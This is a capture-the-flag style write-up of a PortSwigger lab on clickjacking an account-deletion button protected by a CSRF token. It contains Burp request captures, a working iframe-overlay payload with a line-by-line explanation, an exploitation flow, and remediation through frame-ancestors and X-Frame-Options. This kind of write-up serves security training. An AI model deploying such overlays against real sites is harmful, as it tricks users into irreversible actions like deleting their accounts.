# LAB 01 - Basic clickjacking with CSRF token protection

## Lab Information

- **Category:** Click Jacking
- **Type:** CSRF Token
- **Difficulty:** APPRENTICE
- **Status:** ✅ Solved
- **Date:** 2026-9-19

---

![Click-Jacking](https://img.shields.io/badge/Click-Jacking-red)

![Solved](https://img.shields.io/badge/Status-Solved-success)

---

# Table of Contents

- Executive Summary
- Lab Information
- Objective
- Vulnerability Overview
- Attack Prerequisites
- Environment & Scope
- Methodology
- Discovery Process
- Technical Analysis
- Payload Analysis
- Exploitation Flow
- Evidence
- Impact
- Root Cause
- Risk Assessment
- Remediation
- Lessons Learned
- References
- Screenshots

---

# Executive Summary

A Clickjacking vulnerability was identified in the account deletion functionality. The authenticated account page lacked effective anti-framing protections, allowing it to be embedded within an iframe. A deceptive UI element was positioned over the legitimate "Delete account" button, causing a victim's click to be delivered to the underlying sensitive action.

---

# Objective

The objective of this lab is to demonstrate how an attacker can embed an authenticated account page within an iframe, conceal the legitimate interface using CSS, and position a deceptive element over the "Delete account" button to induce the victim to perform an unintended account-deletion action.

---

# Vulnerability Overview

A clickjacking vulnerability occurs when an attacker tricks a victim into believing they are clicking on an element on a specific page, while the click is actually registered on a different site all in the absence of any protective mechanisms against such attacks.

---


# Attack Requirements

1. The target page must be frameable by the attacker.
2. The attacker must be able to control the framing page's layout and CSS.
3. The target page must contain a security-sensitive user action that can be triggered through a click.
4. The victim must be authenticated to the target application.

---

# Environment & Scope

| Item | Value |
|------|-------|
| Target | PortSwigger Web Security Academy lab |
| Primary Endpoint | `/my-account/delete` |
| Primary HTTP Method | POST |
| Primary Action | Account deletion |
| CSRF Parameter | `csrf` |
| Authentication | Session cookie |
| Attack Platform | Exploit Server |
| Attack Vector | Cross-site HTML / iframe |

---

# Methodology

1. Log in to the lab using the provided credentials.
2. Access the authenticated `/my-account?id=wiener` page.
3. Capture the authenticated account-page request using Burp Suite.
4. Review the server response for anti-framing protections.
5. Confirm that the response does not contain `X-Frame-Options` or a CSP `frame-ancestors` directive.
6. Embed the authenticated page within an iframe hosted on the exploit server.
7. Position a deceptive element over the legitimate "Delete account" button.
8. Deliver the exploit to the victim and verify the account-deletion action.
    
---

# Discovery Process

### Step 1 — Capture login request

```text
GET /my-account?id=wiener HTTP/2
HOST: XXXXXXXXXX web-security-academy.net
Cookie: session=XXXXXXXXX
```

The request displays the username "wiener" along with the session data; we use the Repeater to resend the same request and obtain the server's response for analysis.

### Step 2 — Reviewing the response

```text
HTTP/2 200 OK
Content-Type text/html; charset-utf-8
Cache-control:no-cache
Content-Length: 6654
```
Upon examining the response, we observe the absence of any protection mechanism against clickjacking vulnerabilities, such as `X-Frame-Options` or `Content-Security-Policy`.

---

# Payload Analysis

## Payload Used

```html
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 1000px;
        height: 700px;
        opacity: 0;
        z-index: 2;
        border: none;
    }

    .fake-button {
        position: absolute;
        top: 510px;
        left: 70px;
        z-index: 1;
    }
</style>

<button class="fake-button">
    Click Here
</button>

<iframe src="https://LAB-ID.web-security-academy.net/my-account?id=wiener"></iframe>
```

## Why This Payload Works

```html
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 1000px;
        height: 700px;
        opacity: 0;
        z-index: 2;
        border: none;
    }

```
Specific to the frame's formatting ranging from its height, distance from the left, transparency, and stacking order to its length, width, positioning, and edges.

```html
.fake-button {
        position: absolute;
        top: 510px;
        left: 70px;
        z-index: 1;
    }
</style>
```
This section deals with styling the button that will appear above the email deletion button; here, we adjust its height, left spacing, positioning, and arrangement.

```html
<button class="fake-button">
    Click Here
</button>
```
This part deals with creating the dummy button and the text within it.

```html
<iframe src="https://LAB-ID.web-security-academy.net/my-account?id=wiener"></iframe>
```
This part deals with creating the frame and embedding the target page within it using the `src` attribute.

---

# Exploitation Flow

```text

Victim authenticates to the target application
                ↓
Attacker identifies a frameable sensitive page
                ↓
Attacker embeds the page inside an iframe
                ↓
Attacker creates a deceptive UI overlay
                ↓
Attacker aligns the overlay with "Delete account"
                ↓
Iframe is made effectively invisible
                ↓
Exploit is delivered to the victim
                ↓
Victim clicks the visible decoy element
                ↓
Click is received by the legitimate "Delete account" button
                ↓
Browser submits the legitimate form with its valid CSRF token
                ↓
Account deletion is triggered
          
  
```

---

# Impact

The demonstrated impact is unauthorized account deletion.

A successful Clickjacking attack can cause an authenticated victim to unintentionally trigger the application's account-deletion functionality with a single click.

Because account deletion is a destructive and potentially irreversible action, successful exploitation can result in loss of the user's account and associated data.

The lab demonstrates this specific impact; additional consequences would depend on the functionality and sensitivity of the affected application.

---

# Root Cause

The root cause is the absence of effective anti-framing controls on the authenticated account page. The application does not restrict which external origins are permitted to embed the page through an iframe.

As a result, an attacker can frame the authenticated page and use CSS-based UI redressing to align a deceptive interface element with a legitimate security-sensitive action.

---

# Risk Assessment

| Item | Value |
|------|-------|
| Severity |  Medium |
| CVSS Score | Not calculated |
| CWE | CWE-1021: Improper Restriction of Rendered Page Layers or Frames |
| OWASP Reference | OWASP Click Jacking Prevention Guidance |
| Exploitability | Demonstrated in lab |
| Business Impact | Unauthorized account deletion and potential loss of associated account data |

---

# Remediation

- ### Content Security Policy

Implement the `frame-ancestors` directive to explicitly control which origins are allowed to embed the application.

Examples:

Content-Security-Policy: frame-ancestors 'none';

or:

Content-Security-Policy: frame-ancestors 'self';


- ### X-Frame-Options

Deploy `X-Frame-Options` as an additional anti-framing control:

X-Frame-Options: DENY

or:

X-Frame-Options: SAMEORIGIN
    
---

# Lessons Learned

- The presence of a valid CSRF token does not inherently prevent Clickjacking. When the authenticated page is successfully framed and the       victim interacts with the overlaid interface, the legitimate form submission can include the valid CSRF token.
- UI Redressing Mechanism: The attack relies on layering two elements using CSS; the target website is rendered completely invisible via the    opacity property (`opacity: 0`), while deceptive buttons are placed over it to entice the victim into clicking.
- The Importance of Element Alignment: The technical success of the attack relies on precision in using positioning properties (such as         `top`, `left`, and `z-index`) to align the hidden, sensitive buttons with the visible, decoy buttons.
- Absence of basic browser defenses: The lab demonstrates that the site is vulnerable due to the lack of security headers that prevent          framing such as the `X-Frame-Options` header or the Content Security Policy (CSP), specifically the `frame-ancestors` directive.
- Severity of Impact: The attack demonstrates the potential to force a user into taking critical, irreversible actions (such as permanently      deleting their account) with a single unintentional click.
- CSRF Token Limitation: A valid CSRF token protects against certain forged requests, but it does not by itself prevent Clickjacking when an    attacker can cause the victim to interact with the legitimate framed page.


---

# References

- PortSwigger Web Security Academy — Click Jacking
- OWASP — Click Jacking Defense Cheat Sheet
- Mozilla Developer Network (MDN Web Docs)
- FIRST — CVSS Specification

---

# Screenshots

## Request and Response

![Request](Screen-Shots/burb-request-lab1.png)

...

## View exploit

![Exploit](Screen-Shots/view-exploit-lab1.png)

...

## Payload

![payload](Screen-Shots/payload-lab1.png)

...


## Successful 

![Success](Screen-Shots/success-lab1.png)

---

# Conclusion

This practical assessment revealed a "Clickjacking" vulnerability affecting a critical action: account deletion.

In the absence of defensive mechanisms against this vulnerability—such as `X-Frame-Options` or `Content-Security-Policy`—an attacker can embed the target page (which contains the sensitive account-deletion action) within an `<iframe>`. By setting the frame's opacity to zero, the attacker makes it difficult for the victim to see what they are clicking on; then, by positioning a `<div>` element over the account-deletion button, the attacker tricks the victim into clicking it.

The key aspect is that protection against clickjacking attacks requires the use of Content Security Policy (CSP)—specifically the `frame-ancestors` directive—enabling the `X-Frame-Options` security header, and securing cookies via the `SameSite` attribute.

The lesson learned here is that the CSRF token does not protect the page against clickjacking attacks.
